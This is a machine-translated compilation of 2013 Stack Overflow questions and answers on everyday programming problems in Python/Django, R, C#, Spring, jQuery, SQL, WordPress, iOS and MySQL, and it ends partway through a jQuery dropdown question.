> 时间：2013-01-15T22:53:32.607
> 
> 标签：python, django, image, django-templates, python-imaging-library

如果用户上传了一张图片，并且我使用 PIL 调整了它的大小，我会得到一个[PIL Image object](http://www.pythonware.com/library/pil/handbook/introduction.htm)。

`PIL Image`在将文件保存到数据库之前，如何在模板中显示文件？它甚至可以作为图像传入并渲染吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-01-15T23:05:46.093

对于有限的浏览器集，您可以对图像进行 base64 编码并使用内联图像。请参阅[嵌入 Base64 图像](https://stackoverflow.com/questions/1207190/embedding-base64-images)。

[适用于所有浏览器的解决方案是引用返回图像](http://effbot.org/zone/django-pil.htm)的视图的图像标记。

[更新]

> 我想要的只是让用户提交原始图像，然后由另一个表单提示输入图像的标题（调整大小的图像位于标题字段的左侧）。然后，当用户点击“提交”时，图像和标题会保存在模型实例中。

好吧...当您使用时`<img src="foo">`， foo 总是由 GET 检索，也许这就是它不起作用的原因 - request.FILES 在 GET 请求中将不可用。如果您打开 firebug 或 chrome 调试工具栏，在网络选项卡中，您将看到带有上传图像的 POST 请求，然后是获取图像的 GET 请求。

您必须将图像保存在两个步骤之间的某个位置。

> 我还能怎么保存它？我希望它是暂时的。您认为有一种非常简单的方法可以做到这一点，还是我应该研究这些选项？

流行的选择是[redis](http://redis.io)和[memcached](http://memcached.org)。您可以将它们视为具有过期日期的巨型共享 python dict。如果图像很小，例如头像，您还可以将图像数据保存在会话变量中。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2013-01-15T23:11:39.510

是和不是。

是的，您可以将图像作为原始 Base64 数据。这是一个可以用来测试的小脚本：

```
import Image
import base64
import StringIO
output = StringIO.StringIO()
im = Image.open("test.png") # Your image here!
im.save(output, format='PNG')
output.seek(0)
output_s = output.read()
b64 = base64.b64encode(output_s)
open("test.html","w+").write('<img src="data:image/png;base64,{0}"/>'.format(b64)) 
```

然而，这是一个非常糟糕的主意。如果有多个缩略图，您的单个 HTML 页面可能会超过 10MB。

您真正应该做的是使用单独的 Django 视图将来自 PIL 对象的图像作为 PNG 文件返回，然后在`img` `href`页面的属性中引用该视图。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-01-15T23:11:16.517

您可以将 base64 编码的图像嵌入到标签中。所以你可以将 PIL 图像转换为 base64 然后显示它。

```
from PIL import Image
import StringIO

x = Image.new('RGB',(400,400))
output = StringIO.StringIO()
x.save(output, "PNG")
contents = output.getvalue().encode("base64")
output.close()
contents = contents.split('\n')[0] 
```

然后显示：

```
 <img src="data:image/png;base64,' + contents + ' /> 
```

查看[示例输出](http://jsfiddle.net/w8mRz/)。

# r - 在 R 中构建捐赠者归因程序

> ID：14348447
> 
> 赞同：-1
> 
> 时间：2013-01-15T22:53:51.290
> 
> 标签：r

我的非营利组织正在努力了解不同筹款活动的价值。我的数据如下所示：

```
donor <- data.frame(
                    donor_names=c("Donor1","Donor1","Donor2","Donor3","Donor3"),
                    donor_id=c("0A1","0A1","0A2","0A3","0A3"),
                    amount=c(500,400,300,250,100),
                    date=c("1/5/2012","11/10/2011","1/4/2012","1/14/2012","1/10/2012"),
                    campaign=c("grassroots","2012-annual appeal","grassroots","grassroots","Jan10 Auction"),
                    stringsAsFactors=FALSE
                   )

donor$date <- as.Date(donor$date,format="%m/%d/%Y")

  donor_names donor_id amount       date           campaign
1      Donor1      0A1    500 2012-01-05         grassroots
2      Donor1      0A1    400 2011-11-10 2012-annual appeal
3      Donor2      0A2    300 2012-01-04         grassroots
4      Donor3      0A3    250 2012-01-14         grassroots
5      Donor3      0A3    100 2012-01-10      Jan10 Auction 
```

鉴于捐赠者未来的所有捐款都可以归因于他们首次捐赠的活动，我需要看看有多少捐款可以归因于每个活动。

最终结果将返回“2012 年度上诉”和 900，“草根”和 300，“Jan10 Auction”和 350。

先感谢您。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T23:56:24.913

```
library("plyr")

ddply(ddply(donor,
            .(donor_names),
            summarize,
            amount = sum(amount),
            campaign = campaign[date == min(date)]),
      .(campaign),
      summarize,
      amount = sum(amount)) 
```

这使

```
 campaign amount
1 2012-annual appeal    900
2         grassroots    300
3      Jan10 Auction    350 
```

# c# - 在 C# WinForms 中查看/编辑 office 文件

> ID：14348450
> 
> 赞同：0
> 
> 时间：2013-01-15T22:54:06.707
> 
> 标签：c#, winforms

是否有可用于查看/编辑 Microsoft Office 文件的商业库（用于 c# WinForms）？

我需要它用于可以打开和/或编辑 Office 文件的商业应用程序。该应用程序需要一个嵌入式控件，而不是将用户重定向到已安装的 Microsoft Office 实例。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:03:38.373

您只需要添加这些 using 语句：

```
using Microsoft.Office.Interop;
using Microsoft.Office.Interop.Excel; 
```

然后您可以将`ExcelObj`,`Workbork`和添加`Worksheet`到您的应用程序中。这一切都是不言自明的。在以下示例中，您读取电子表格的内容：

然后您可以通过执行以下操作从电子表格中读取：

```
private void GetData(string fileName, string tabName)
{
    Application ExcelObj = new Application();

    Workbook theWorkbook = ExcelObj.Workbooks.Open(fileName,
        Type.Missing, Type.Missing, Type.Missing, Type.Missing,
        Type.Missing, Type.Missing, Type.Missing, Type.Missing,
        Type.Missing, Type.Missing, Type.Missing, Type.Missing,
        Type.Missing, Type.Missing);

    Sheets sheets = theWorkbook.Worksheets;
    Worksheet worksheet = (Worksheet)sheets[tabName];

    Range range = worksheet.get_Range("A1:A1", Type.Missing);

    string data = range.Text as string;

    // Your code...

    theWorkbook.Close(false, fileName, null);
} 
```

如果要使用 Office 产品执行此操作，则必须安装 Microsoft Office 的副本并安装子程序 PIA（主要互操作程序集）。否则，您必须寻找替代方案，例如：

*   [NPOI](http://npoi.codeplex.com/) - 免费且开源。
*   [Aspose](http://www.aspose.com/.net/excel-component.aspx) - 绝对不是免费的，但很强大。
*   [电子表格 XML](http://msdn.microsoft.com/en-us/library/aa140066%28office.10%29.aspx) - 基本上是用于创建电子表格的 XML。
*   [OfficeWriter 应用程序 API](http://www.officewriter.com/officewriter-version-differences)
*   [EPPlus](http://epplus.codeplex.com/)，一个使用 Open Office XML 格式读写 Excel 2007/2010 文件的 .NET 库。

# c# - 通过 ASP.NET 使用 HTML5 多文件上传

> ID：14348451
> 
> 赞同：3
> 
> 时间：2013-01-15T22:54:13.667
> 
> 标签：c#, asp.net, html, file-upload, file-io

我正在尝试使用上传多个文件

`<input id="testUpload" type="file" multiple="true"/>`

（是的，我知道它在 IE 上不起作用）。但我的问题是在代码中迭代每个文件并上传它之后我应该做什么？

我正在努力

```
foreach(HttpPostedFile file in Request.Files["testUpload"]){

} 
```

但我明白了

```
foreach statement cannot operate on variables of type 'System.Web.HttpPostedFile' because 'System.Web.HttpPostedFile' does not contain a public definition for 'GetEnumerator' 
```

我知道我可以为`multiple = "false"`：

```
HttpPostedFile file = Request.Files["testUpload"]; 
```

然后对该文件进行操作。但是如果我选择多个文件呢？如何迭代每个使用`foreach`？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-01-15T23:06:59.770

您正在尝试迭代一个文件而不是集合。

改变

```
foreach(HttpPostedFile file in Request.Files["testUpload"]){

} 
```

到

**编辑**- 根据评论更改为 for 循环

```
for (int i = 0; i < Request.Files.Count; i++)
{
    HttpPostedFileBase file = Request.Files[i];
    if(file .ContentLength >0){
    //saving code here

  } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-03-24T02:04:31.410

谢谢你，谢谢你，谢谢你。它拯救了我的一天。

但是，我不得不使用 HttpPostedFile 而不是 HttpPostedFileBase。

```
for (int i = 0; i < Request.Files.Count; i++)
{
    **HttpPostedFile** file = Request.Files[i];
    if(file .ContentLength >0){
    //saving code here
    }
}
```

无论哪种方式，这都很棒

# spring - 如何在 HandlerInterceptorAdapter 中使用 @ResponseBody 记录 Spring 3 控制器的 JSON 响应？

> ID：14348452
> 
> 赞同：4
> 
> 时间：2013-01-15T22:54:13.713
> 
> 标签：spring, spring-mvc, interceptor

我有将 JSON 返回给客户端的控制器。控制器方法使用 mvc 注释进行标记，例如：

```
@RequestMapping("/delete.me")
public @ResponseBody Map<String, Object> delete(HttpServletRequest request, @RequestParam("ids[]") Integer[] ids) { 
```

Spring 知道返回 JSON，因为 Jackson 在类路径上并且客户端正在请求 JSON 响应。我想记录这些请求和所有其他控制器的响应。在过去，我使用拦截器来执行此操作。但是，我从 ModelAndView 获得了响应正文。既然我正在使用@ResponseBody，如何在拦截器中获取响应正文？具体来说，如何在此方法中获取响应正文？

```
public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) { 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-30T16:25:39.563

您可以通过使用来记录所有内容，`CustomizableTraceInterceptor` 您可以在应用程序上下文 xml 配置中设置它并使用 AOP：（日志级别跟踪）

```
 <bean id="customizableTraceInterceptor"  
        class="org.springframework.aop.interceptor.CustomizableTraceInterceptor">  
        <property name="exitMessage" value="Leaving $[methodName](): $[returnValue]" />  
    </bean> 
```

或者您可以通过在 Java 中实现它并使用 setExitMessage() 方法来完全自定义它：

```
public class TraceInterceptor extends CustomizableTraceInterceptor {

    private Logger log = LoggerFactory.getLogger("blabla");

    @Override
    protected void writeToLog(Log logger, String message, Throwable ex) {
        //Write debug info when exception is thrown
        if (ex != null) {
            log.debug(message, ex);
        }
          ....
    }

    @Override
    protected boolean isInterceptorEnabled(MethodInvocation invocation, Log logger) {
        return true;
    }

    @Override
    public void setExitMessage(String exitMessage) {
            .... //Use PlaceHolders
    }
} 
```

并使用诸如“$[returnValue]”之类的占位符。[您可以在spring api 文档](http://static.springsource.org/spring/docs/3.0.x/javadoc-api/org/springframework/aop/interceptor/CustomizableTraceInterceptor.html)中找到完整列表。

编辑：另外，如果您想在另一个拦截器中获取 @ResponseBody 的值，我认为在版本 > 3.1.1 之前这是不可能的。检查这个问题：[https ://jira.springsource.org/browse/SPR-9226](https://jira.springsource.org/browse/SPR-9226)

# jquery - X 秒后滑到底部 0

> ID：14348457
> 
> 赞同：0
> 
> 时间：2013-01-15T22:54:40.267
> 
> 标签：jquery, delay, slide

底部底部有一个黑色的绝对div：-220px；（类=“tf_content”）。它需要在 X 秒后自动滑到底部：0。

这是（一页）[网站](http://www.naamfaam.graffx.nl/)

脚本看起来有点像这样？？？：

```
$(document).ready(function() {
  $(".tf_content")
        .animate({bottom: -220px})
        .delay(4000)
}); 
```

我还需要在使用该类加载新 div 后重置它？，请参阅网站。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:07:05.983

向下滑动用于显示某些内容，而不是隐藏它。

由于您使用绝对定位，请尝试类似

```
$(".tf_content").animate({bottom: -220px}, 500) 
```

**编辑：**

改用高度

```
$(".tf_content").delay(5000).animate({    height: "0px",  }, 500 ); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T23:01:45.007

```
 $(document).ready(function() {
  $("#load_limit").slideUp(600)
                  .delay(6000)
                  .slideDown(600);
});

<div id="load_limit">some value here</div> 
```

div {高度：100px；背景：红色；}

像这样的东西？

编辑到您自己的规格...

[http://jsfiddle.net/xjEy5/2/](http://jsfiddle.net/xjEy5/2/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-15T22:58:20.293

为什么使用窗口？利用

```
 setTimeout(show_popup, 5000); 
```

要不就

```
$(".tf_content").delay(5000).slideDown(); 
```

# android - 如何在 android opengl 1.0 应用程序的最大纹理宽度上过滤手机

> ID：14348459
> 
> 赞同：4
> 
> 时间：2013-01-15T22:54:43.460
> 
> 标签：android, opengl-es, filtering, textures

我在 android 中创建了一个 openGL 应用程序，它有一些我创建的不同尺寸的纹理（1024,1024 和 2048,2048）我选择了 2048，因为这是 Galaxy s3 支持的。我想知道是否有办法过滤哪些手机可以在 max_texture_width 上看到我的应用程序 我查看了几个资源

例如 [http://developer.android.com/guide/topics/manifest/supports-screens-element.html](http://developer.android.com/guide/topics/manifest/supports-screens-element.html)

[http://developer.android.com/google/play/filters.html](http://developer.android.com/google/play/filters.html)

并且找不到任何帮助，我可以看到很多以编程方式执行此操作的方法，例如：

[android中合理的纹理大小](https://stackoverflow.com/questions/7031742/reasonable-texture-sizes-in-android)

但是由于我的纹理中较小的一个是 1204x1024 并且一些显卡会在此崩溃，所以我不希望我的应用程序能够走得那么远。有人对如何解决这个问题有任何建议吗？如果我要创建 512x512 的较小纹理尺寸，我将需要一个额外的算法，由于其他原因，我（可能）无法在时间限制内编写该算法。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T12:08:21.917

You cannot filter apps by declaring max supported texture size in manifest, only on supported texture format(s). Alternatively, you can filter your apps on Google Play per device, but there are way too much devices for you to check compatibility with.

# internet-explorer-7 - IE7 Elements 获取媒体查询

> ID：14348460
> 
> 赞同：2
> 
> 时间：2013-01-15T22:54:54.557
> 
> 标签：internet-explorer-7, media-queries

IE7 正在扫描我的 CSS 中的所有样式，无论它们是否在媒体查询中。我认为 IE7/8 忽略了媒体查询。它并没有忽视它们，它只是通过并抓住所有的风格。很奇怪。

我试图寻找一个解决方案，但我能找到的只是破解它的方法，因此媒体查询实际上可以在 IE7 中工作。

最好的方法是为在 IE7 中不加载的媒体查询创建一个单独的 css 文件吗？

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T07:56:50.467

有 JS 库可以让 IE 支持 CSS3 媒体查询：

[https://github.com/scottjehl/Respond](https://github.com/scottjehl/Respond)

[http://code.google.com/p/css3-mediaqueries-js/](http://code.google.com/p/css3-mediaqueries-js/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-03T13:38:35.983

我有同样的问题。IE7 不会忽略媒体查询，所以我想到了两个解决方案，尽管我希望有一个更优雅的解决方案：

1) 将所有查询放在页面顶部，因此最后的默认外观将优先。不幸的是，如果您根据例如屏幕大小来覆盖样式，那么您必须将媒体查询放在底部。

2) 使用特定于 IE 的样式表（在主样式表之后加载）重置 IE7 中的样式。我一直在使用的方法取自 Boilerplate（特别是 Wordpress 中的 Boilerplate 主题：http://wordpress.org/extend/themes/boilerplate [）](http://wordpress.org/extend/themes/boilerplate)：

```
<!--[if lt IE 7 ]><html class="no-js ie ie6 lte7 lte8 lte9"><![endif]-->
<!--[if IE 7 ]><html class="no-js ie ie7 lte7 lte8 lte9"><![endif]-->
<!--[if IE 8 ]><html class="no-js ie ie8 lte8 lte9"><![endif]-->
<!--[if IE 9 ]><html class="no-js ie ie9 lte9"><![endif]-->
<!--[if (gt IE 9)|!(IE)]><!--><html class="no-js"><!--<![endif]--> 
```

这使您能够以 IE 浏览器为目标，并且您可以将样式放在它自己的样式表中（这样其他浏览器根本不会加载它）或放在普通样式表的末尾。

```
html.ie7 div {} 
```

等等。

这两种方法都不是很优雅……这就是我讨厌 Internet Explorer 的原因。（你相信我的网站仍然有来自 IE7 和 IE6 用户的访问吗？对于 IE6 用户来说太糟糕了，但我什至不再为检查他们的兼容性而烦恼了。）

# sql - 查找两列之间是否存在电话号码

> ID：14348462
> 
> 赞同：5
> 
> 时间：2013-01-15T22:54:59.817
> 
> 标签：sql, tsql, loops, between

我正在尝试使用 TSQL 传递两个 10 位数的电话号码块。

让我们说：

```
TelephoneNumber1: 1234560095
TelephoneNumber2: 1234561005 
```

我的表由 3 列组成：

```
ID, StartBlock, EndBlock
1, 5671231000, 5671232000
2, 1234561000, 1234562000
3, 2175551200, 2175551300 
```

所以我要做的是找到`TelephoneNumber1`和之间的所有数字`TelephoneNumber2`，看看它是否存在于表之间的任何记录`StartBlock`之间`EndBlock`。

在这个例子中，它会在第二条记录中找到一个已经在使用的数字，因为当`1234560095`到达 时`1234561000`，它会发现它已经在使用中。

如何在 StartBlock 和 EndBlock 之间找到正在使用的数字？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T17:52:06.773

```
declare @T table
(
  ID int,
  StartBlock bigint, 
  EndBlock bigint
)

insert into @T values
(1, 5671231000, 5671232000),
(2, 1234561000, 1234562000),
(3, 2175551200, 2175551300)

declare @TelephoneNumber1 bigint 
declare @TelephoneNumber2 bigint 

set @TelephoneNumber1 = 1234560095
set @TelephoneNumber2 = 1234561005

select * 
from @T
where StartBlock <= @TelephoneNumber2 and 
      EndBlock >= @TelephoneNumber1 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T23:17:52.433

这可以通过简单地完成：

```
SELECT * FROM tblName
WHERE StartBlock >= '5671231000' AND EndBlock <= '5671232000' 
```

**结果：**

```
| ID | StartBlock | EndBlock |
--------------------------------
| 1  | 5671231000 | 5671232000 |
--------------------------------
| 4  | 5671231120 | 5671231010 |
--------------------------------
| 5  | 5671231540 | 5671231999 | 
```

它应该产生一个带有 start 和 end 块的结果，包括介于两者之间的所有内容。看看这些[TSQL 示例](http://msdn.microsoft.com/en-us/library/ms187922.aspx)，您将找到两种方法来完成此操作。

**[演示在这里](http://sqlfiddle.com/#!2/32d1d/1)**。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T23:05:05.280

这是你要找的吗？

```
SELECT * FROM tel
WHERE StartBlock <= '1234561005' AND EndBlock >= '1234561005' 
```

**结果**

```
| 身份证 | 启动块 | 端块 |
--------------------------------
| 2 | 1234561000 | 1235552000 |
```

## [查看演示](http://sqlfiddle.com/#!2/e1e40/3)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-15T23:03:02.040

我不确定我是否遗漏了什么，但不仅仅是：

```
SELECT * from MYTABLE 
WHERE (StartBlock=>TelehoneNumber1 AND StartBlock<=TelephoneNumber2) 
OR (EndBlock=>TelehoneNumber1 AND EndBlock<=TelephoneNumber2) 
```

编辑：只是看着这个，看到 BETWEEN，另一种选择： [http ://www.w3schools.com/sql/sql_where.asp](http://www.w3schools.com/sql/sql_where.asp)

# java - 如何使用 JRecord 输出字符串

> ID：14348464
> 
> 赞同：0
> 
> 时间：2013-01-15T22:55:10.180
> 
> 标签：java, xml, flat-file, jrecord

我正在尝试使用 JRecord 将 XML/Bean（任何一个）转换为固定长度的平面文件。我无法将其正确输出到文件中的字符串。我只能得到二进制输出。所以我只会将 XML/Beant 转换为字符串。不是二进制固定长度等等。

有没有人用 JRecord 解决了这个问题？

您可以推荐任何其他带有示例的框架吗？并举个例子。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T07:22:31.130

我是[JRecordBind](http://jrecordbind.org/)的作者，这是一个与 JRecord（我认为）功能相同的 Java 库，它基于 XML Schema

这是主页上的几个示例，而更多示例可用作测试的输入

[https://github.com/ffissore/jrecordbind/tree/master/jrecordbind-test/src/test/resources](https://github.com/ffissore/jrecordbind/tree/master/jrecordbind-test/src/test/resources)

# elasticsearch - 在 django 中使用弹性搜索复制

> ID：14348467
> 
> 赞同：1
> 
> 时间：2013-01-15T22:55:19.060
> 
> 标签：elasticsearch, django-haystack

当前的设置由 3 个弹性搜索服务器组成，其中一个是主服务器，另外两个是从服务器，至少它们是这样定义自己的。

主节点可能会宕机，对于任何类型的问题，这意味着弹性搜索将找到一个新的符合条件的主节点并切换到这个新的主节点。

目前的问题是我在前端服务器上的所有应用程序都完全没有意识到这一点，所以它会向同一个后端发起查询，当然会杀死我所有的网站，因为它不会回答。我环顾四周，但我找不到任何与动态后端切换相关的内容，甚至与新的 Haystack 2.x 相关。

有什么建议吗？

提前谢谢了

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T23:48:58.343

我似乎没有必要将此留给您的应用程序层。很可能您通过 HTTP-REST 请求访问 ES，这意味着您可以将任何 HTTP 负载均衡器（如 Nginx）放在 ES 服务器前面，如果有一次超时，它们也应该切换到另一个节点。

# jenkins - 无法在詹金斯中声明构建

> ID：14348468
> 
> 赞同：7
> 
> 时间：2013-01-15T22:55:19.873
> 
> 标签：jenkins, jenkins-plugins

在我们的 Jenkins (1.492) 上，我安装了[Claim Plugin](https://wiki.jenkins-ci.org/display/JENKINS/Claim+plugin)。Jenkins 配置为使用矩阵授权使用 LDAP。

安装插件并在每个作业的配置中启用插件后，/claim 视图会显示“欢迎来到 Hudson Claim Report。没有失败的构建。出色的工作！” 并且没有列出任何要声明的构建。

我有不稳定和失败的构建。

*   在安装插件和配置作业后，我已经重建了失败和不稳定的构建。
*   我还将默认视图更改回“全部” - 我在某处读到可能有问题。
*   我也确实重新启动了詹金斯。
*   我使用 LDAP 用户登录。
*   声明视图没有列出任何内容。
*   我在作业的构建历史记录中没有声明图标。
*   我在“由用户启动”下方的构建页面上没有声明链接。
*   我已将“声明”列添加到测试失败的自定义视图中 - 但它是空的。
*   但我可以通过不稳定构建的测试报告视图声明单一回归。

我错过了什么？我怎样才能找到问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-02-21T11:49:31.393

为了激活声明插件，您必须首先将“允许损坏的构建声明”操作添加到一个或多个作业的“构建后操作”部分。添加此步骤后，下次作业失败时，应该可以声明它。

在大量作业上配置这个有点痛苦，但幸运的是，有人贡献了一个[Groovy 脚本](https://wiki.jenkins-ci.org/display/JENKINS/Allow+broken+build+claiming+on+every+jobs)来允许对每个作业进行损坏的构建声明。

# php - 如何检测它是否是 WordPress 中的 AJAX 请求？

> ID：14348470
> 
> 赞同：45
> 
> 时间：2013-01-15T22:55:29.063
> 
> 标签：php, ajax, wordpress

是否有办法检测当前服务器操作当前是否是 WordPress 中的 AJAX 请求？

例如：

```
is_ajax() 
```

* * *

## 回答 #1

> 赞同：96
> 
> 时间：2013-01-16T01:07:36.073

更新：从 WordPress 4.7.0 开始，您可以调用函数[wp_doing_ajax()](https://developer.wordpress.org/reference/functions/wp_doing_ajax/)。这是更可取的，因为以不同方式“执行 Ajax”的插件可以过滤以将“假”变为“真”。

* * *

原答案：

如果您[按照 codex 中的建议](http://codex.wordpress.org/AJAX_in_Plugins)使用 Ajax ，则可以测试`DOING_AJAX`常量：

```
if (defined('DOING_AJAX') && DOING_AJAX) { /* it's an Ajax call */ } 
```

* * *

## 回答 #2

> 赞同：33
> 
> 时间：2017-02-27T17:13:20.237

**WordPress 4.7**引入了一种简单的方法来检查 AJAX 请求，所以我想我会添加到这个旧问题。

```
wp_doing_ajax() 
```

来自[开发者参考](https://developer.wordpress.org/reference/functions/wp_doing_ajax/)：

*   说明：判断当前请求是否为 WordPress Ajax 请求。

*   返回：(bool) 如果是 WordPress Ajax 请求则为真，否则为假。

它本质上是 DOING_AJAX 的包装器。

* * *

## 回答 #3

> 赞同：16
> 
> 时间：2013-01-15T23:04:30.213

要查看当前请求是否是从 js 库（如**jQuery ）发送的****AJAX**请求，您可以尝试以下操作：

 **```
if( ! empty( $_SERVER[ 'HTTP_X_REQUESTED_WITH' ] ) &&
      strtolower( $_SERVER[ 'HTTP_X_REQUESTED_WITH' ]) == 'xmlhttprequest' ) {
    //This is an ajax request.
} 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2013-01-15T23:02:22.103

我不确定 WordPress 是否有此功能，但可以通过自己创建一个简单的功能来完成。

```
if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest')
{
    // Is AJAX request
    return true; 
} 
```

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2016-02-14T13:53:14.733

我知道这是一个旧线程，但接受的答案存在问题，

如果请求是对 admin-ajax.php 文件的请求，那么检查定义的 DOING_AJAX 常量将始终为真。（[https://core.trac.wordpress.org/browser/tags/4.4.2/src/wp-admin/admin-ajax.php#L16](https://core.trac.wordpress.org/browser/tags/4.4.2/src/wp-admin/admin-ajax.php#L16)）

有时 admin-ajax.php 钩子不用于 AJAX 请求，只是一个简单的端点（例如 Paypal IPN）。

正确的方法是伊恩和斯宾塞提到的。

```
if( ! empty( $_SERVER[ 'HTTP_X_REQUESTED_WITH' ] ) &&
      strtolower( $_SERVER[ 'HTTP_X_REQUESTED_WITH' ]) == 'xmlhttprequest' ) {
    //This is an ajax request.
} 
```

（会发表评论......但没有代表）

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2014-10-25T08:14:23.887

```
if ( ! function_exists('is_ajax') ) {
    function is_ajax() {
        return defined( 'DOING_AJAX' );
    }
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-04-09T15:58:36.500

我个人更喜欢`wp_doing_ajax()`，但这是另一个应该这样做的例子。

```
if( true === strpos( $_SERVER[ 'REQUEST_URI' ], 'wp-admin/admin-ajax.php' ) ) {
    // is doing ajax
} 
```**

# c++ - 队列的最小值

> ID：14348485
> 
> 赞同：0
> 
> 时间：2013-01-15T22:56:30.700
> 
> 标签：c++, struct, queue

我有这个代码

```
 std::queue<int> q;
/* fill queue ... */
int min_value = INT_MAX;
std::size_t size = q.size();
while (size-- > 0) {
    int x = q.front();
    q.pop();
    q.push(x);
    if (x < min_value)
        min_value = x;
} 
```

这段代码将给出队列的最小大小（我猜）但想知道如何？我们设置 int min_value = INT_MAX 但 max 是整数的上限？那么 x < min_value 如何（如何与整数的 maxlimit 进行比较）

有人可以解释一下这个代码流程吗

# ios - 日期解析在德国区域格式与美国的表现不同

> ID：14348492
> 
> 赞同：0
> 
> 时间：2013-01-15T22:56:55.240
> 
> 标签：ios, localization, nsdateformatter

满嘴：当我将日期“Tue, 15 Jan 2013 11:18:57 -0800”传递给 NSDateFormatter 时，模式字符串 @"EEE, dd MMM yyyy HH:mm:ss ZZZ" 当我的区域格式设置为“美国”，它工作正常。

当我做同样的事情时——除了我的区域格式设置为德国——它无法解析它。

知道为什么会这样吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T23:20:06.480

只是一个猜测：如果区域格式设置为德语，那么天的名称也会被翻译成德语。我会尝试检查是否可以用德语区域格式解析“Die, 15 Jan 2013 11:18:57 -0800”。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T23:43:02.303

dateFormatter 的语言环境将设置为设备的 currentLocale，因此您需要将其设置为与您尝试格式化的日期相同的区域。

```
NSLocale *locale = [[NSLocale alloc] initWithLocaleIdentifier:@"en_US_POSIX"];
[dateFormatter setLocale:locale]; 
```

# mysql - Cron 作业在 MySQL 表之间移动多行

> ID：14348493
> 
> 赞同：1
> 
> 时间：2013-01-15T22:56:58.743
> 
> 标签：mysql, cron, mysqldump

我有一个主数据库，每天最多可存储 5'000 行新行。

我想要第二个数据库，随时只包含最近 30 天的数据。

因此，我计划设置一个 cron 作业，定期转储超过 30 天的行并复制新的行。

复制部分的最佳设计是什么？

*   单独使用 MySQL 即时复制
*   MySql 导出到 txt 文件，然后是 MySql 导入，然后删除临时文件
*   一个遍历行并一一复制的php脚本

我想要稳健性和最少的 CPU/内存使用量

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T02:07:49.113

最快和最健壮的方法是直接在 MySQL 中执行传输。以下是涉及的步骤：

首先，创建第二个表：

```
CREATE TABLE IF NOT EXISTS second.last30days LIKE main_table; 
```

接下来，插入 30 天或更早的记录：

```
INSERT INTO 
second.last30days
SELECT
*
FROM
main_table
WHERE
created >= CURDATE() - INTERVAL 30 DAYS
ORDER BY created; 
```

最后，删除超过 30 天的记录：

```
DELETE FROM 
second.last30days
WHERE
created < CURDATE() - INTERVAL 30 DAYS
ORDER BY created; 
```

建议不要同时运行`INSERT`and`DELETE`语句。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:11:29.660

如果数据库都托管在同一台服务器上。只需使用一个`insert ... select`语句。这样你就可以最小化一切。1个查询，完成。

[MySQL 5.0 - 13.2.5.1。插入 ... 选择语法"](http://dev.mysql.com/doc/refman/5.0/en/insert-select.html "MySQL 5.0 - 13.2.5.1。 插入 ... 选择语法")

# javascript - 用于自动填充下拉菜单的 Jquery 脚本有效，但我怎样才能让用户仍然选择选项？

> ID：14348494
> 
> 赞同：0
> 
> 时间：2013-01-15T22:57:04.817
> 
> 标签：javascript, jquery, jquery-selectors

我在下面有一个脚本，用于从基于 INPUT TEXT 的选择标签中自动填充下拉菜单。我如何才能真正做到这一点，所以如果用户想要更改已自动填充的选项，他或她仍然可以更改什么已通过他或她选择的选项填充到下拉菜单中，同时仍保留自动填充功能，我希望它仍然自动填充，但如果用户不喜欢该选项，他仍然可以更改它.. 下面是自动填充下拉选择的工作脚本

```
<html>
<head> <title> validation </title >
    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.0/jquery.min.js"></script>
    <script type="text/javascript">
    function checkValues()
{
      jQuery("#ddl_StxName").val("stm3","stx2");
      jQuery("#ddl_rtumodel").val("both");

  ESNList = jQuery("#ESNList").val();
  if((ESNList >= 986329) && (ESNList <= 999999))
  {
    jQuery("#ddl_StxName").val("stx2");
    jQuery("#ddl_rtumodel").val("globalstar");
  }
  if ((ESNList >= 660000) && (ESNList <= 699999))
  {
    jQuery("#ddl_StxName").val("mmt");
    jQuery("#ddl_rtumodel").val("globalstar");
  }
   if ((ESNList >= 200000) && (ESNList <= 299999))
  {
    jQuery("#ddl_StxName").val("stm3");
    jQuery("#ddl_rtumodel").val("stmcomtech");
  }
   if ((ESNList >= 1202114) && (ESNList <= 1299999))
  {
    jQuery("#ddl_StxName").val("smartone");
    jQuery("#ddl_rtumodel").val("globalstar");
}

  // you should be able to follow the above and add your own conditions  
}

function checkInput()
{
  jQuery(":text").each(function (){
    if (jQuery(this).val().length == 0)
    {
      jQuery(this).css("border", "2px solid red");
    }
    else
    {
      jQuery(this).css("border", "0");
    }
  });
}
setInterval(function () {checkInput();checkValues();}, 500);
</script>
<body>
<form id="provision">
    ESNList:    <input  type="text" id="ESNList" name="ESNList" size="30" /> <br />
